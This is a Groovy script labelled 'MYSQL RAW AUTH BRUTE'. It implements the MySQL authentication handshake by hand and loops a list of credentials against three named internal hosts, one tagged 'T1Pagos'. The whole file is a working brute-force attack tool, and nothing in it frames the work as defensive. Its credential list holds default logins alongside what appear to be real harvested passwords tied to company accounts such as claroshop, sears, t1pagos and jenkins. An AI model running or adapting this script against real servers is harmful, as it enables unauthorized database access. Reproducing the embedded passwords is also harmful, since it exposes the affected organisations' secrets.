import java.security.MessageDigest
import java.net.Socket

println "=== MYSQL RAW AUTH BRUTE ==="

def mysqlAuth(String host, int port, String user, String pass) {
    try {
        def s = new Socket()
        s.connect(new java.net.InetSocketAddress(host, port), 4000)
        s.setSoTimeout(4000)
        def is = s.getInputStream()
        def os = s.getOutputStream()
        
        def lenBuf = new byte[4]
        is.read(lenBuf, 0, 4)
        def pktLen = (lenBuf[0] & 0xFF) | ((lenBuf[1] & 0xFF) << 8) | ((lenBuf[2] & 0xFF) << 16)
        
        def greeting = new byte[pktLen]
        def totalRead = 0
        while (totalRead < pktLen) {
            def r = is.read(greeting, totalRead, pktLen - totalRead)
            if (r < 0) break
            totalRead += r
        }
        
        def versionEnd = 0
        for (int i = 1; i < greeting.length; i++) {
            if (greeting[i] == 0) { versionEnd = i; break }
        }
        
        def salt1 = new byte[8]
        System.arraycopy(greeting, versionEnd + 5, salt1, 0, 8)
        def salt2Start = versionEnd + 5 + 8 + 1 + 2 + 1 + 2 + 2 + 1 + 10
        def salt2 = new byte[12]
        if (salt2Start + 12 <= greeting.length) {
            System.arraycopy(greeting, salt2Start, salt2, 0, 12)
        }
        
        def fullSalt = new byte[20]
        System.arraycopy(salt1, 0, fullSalt, 0, 8)
        System.arraycopy(salt2, 0, fullSalt, 8, 12)
        
        byte[] authData
        if (pass.isEmpty()) {
            authData = new byte[0]
        } else {
            def md = MessageDigest.getInstance("SHA-1")
            def passHash1 = md.digest(pass.getBytes("UTF-8"))
            md.reset()
            def passHash2 = md.digest(passHash1)
            md.reset()
            md.update(fullSalt)
            md.update(passHash2)
            def scramble = md.digest()
            authData = new byte[20]
            for (int i = 0; i < 20; i++) {
                authData[i] = (byte)(passHash1[i] ^ scramble[i])
            }
        }
        
        def userBytes = user.getBytes("UTF-8")
        def pktPayload = new ByteArrayOutputStream()
        def clientCaps = 0x000FA68D
        pktPayload.write((clientCaps & 0xFF) as int)
        pktPayload.write(((clientCaps >> 8) & 0xFF) as int)
        pktPayload.write(((clientCaps >> 16) & 0xFF) as int)
        pktPayload.write(((clientCaps >> 24) & 0xFF) as int)
        [0x00, 0x00, 0x00, 0x01].each { pktPayload.write(it as int) }
        pktPayload.write(33)
        pktPayload.write(new byte[23])
        pktPayload.write(userBytes)
        pktPayload.write(0)
        pktPayload.write(authData.length)
        if (authData.length > 0) pktPayload.write(authData)
        
        def payload = pktPayload.toByteArray()
        def authPkt = new byte[4 + payload.length]
        authPkt[0] = (byte)(payload.length & 0xFF)
        authPkt[1] = (byte)((payload.length >> 8) & 0xFF)
        authPkt[2] = (byte)((payload.length >> 16) & 0xFF)
        authPkt[3] = (byte)1
        System.arraycopy(payload, 0, authPkt, 4, payload.length)
        
        os.write(authPkt)
        os.flush()
        
        is.read(lenBuf, 0, 4)
        def respLen = (lenBuf[0] & 0xFF) | ((lenBuf[1] & 0xFF) << 8) | ((lenBuf[2] & 0xFF) << 16)
        def resp = new byte[respLen]
        totalRead = 0
        while (totalRead < respLen) {
            def r = is.read(resp, totalRead, respLen - totalRead)
            if (r < 0) break
            totalRead += r
        }
        
        def respType = resp[0] & 0xFF
        s.close()
        
        if (respType == 0x00) {
            return "SUCCESS"
        } else if (respType == 0xFF) {
            def errCode = (resp[1] & 0xFF) | ((resp[2] & 0xFF) << 8)
            def errEnd = Math.min(resp.length, 60)
            def errMsg = new String(resp, 9, errEnd - 9, "UTF-8").trim()
            return "DENIED(${errCode}:${errMsg})"
        } else {
            return "RESP_0x${String.format('%02X', respType)}"
        }
    } catch (Exception e) {
        return "ERR:${e.class.simpleName}"
    }
}

def targets = [
    ["172.27.141.4",   3306, "T1Pagos"],
    ["172.27.141.6",   3306, "MySQL-141.6"],
    ["172.27.140.151", 3306, "Redis-host"],
]

def creds = [
    ["root", ""],
    ["root", "@st0rAg3K3Y"],
    ["root", "nBZxDxL2XxYwAEYyttme"],
    ["root", "root"],
    ["root", "JenkisLegasy25"],
    ["root", "dtvV50vwfGq5CO9"],
    ["root", "plug*spoke!MosqueCloud3col"],
    ["admin", ""],
    ["admin", "admin"],
    ["admin", "@st0rAg3K3Y"],
    ["claroshop", ""],
    ["claroshop", "claroshop"],
    ["claroshop", "@st0rAg3K3Y"],
    ["sears", ""],
    ["sears", "sears"],
    ["t1pagos", ""],
    ["t1pagos", "t1pagos"],
    ["jenkins", "JenkisLegasy25"],
    ["jenkins", "e6LBqIkOI\$PR1XX2oia"],
    ["deploy", "deploy"],
    ["app", "app"],
    ["mysql", ""],
    ["mysql", "mysql"],
]

targets.each { t ->
    println "\n--- ${t[2]} (${t[0]}:${t[1]}) ---"
    creds.each { c ->
        def r = mysqlAuth(t[0], t[1] as int, c[0], c[1])
        def tag = r.startsWith("SUCCESS") ? "[+]" : "[-]"
        def passDisp = c[1].isEmpty() ? "(empty)" : c[1].take(25)
        println "  ${tag} ${c[0]}:${passDisp} => ${r}"
    }
}

println "\n=== AUTH DONE ==="
